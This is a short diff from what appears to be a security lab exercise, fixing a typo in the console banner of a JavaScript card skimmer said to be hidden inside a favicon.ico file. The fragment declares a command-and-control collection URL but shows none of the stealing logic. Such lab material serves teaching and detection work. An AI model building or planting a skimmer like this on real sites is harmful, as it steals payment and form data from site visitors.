@@ -1,6 +1,6 @@
 // This code is hidden inside favicon.ico!
 (function () {
-    console.log('%c [!] STIEG SKIMMER LOADED FROM FAVICON [!]', 'color: red; font-size: 20px; font-weight: bold;');
+    console.log('%c [!] STEGO SKIMMER LOADED FROM FAVICON [!]', 'color: red; font-size: 20px; font-weight: bold;');
 
     const C2_URL = '/lab4/c2/collect';
 
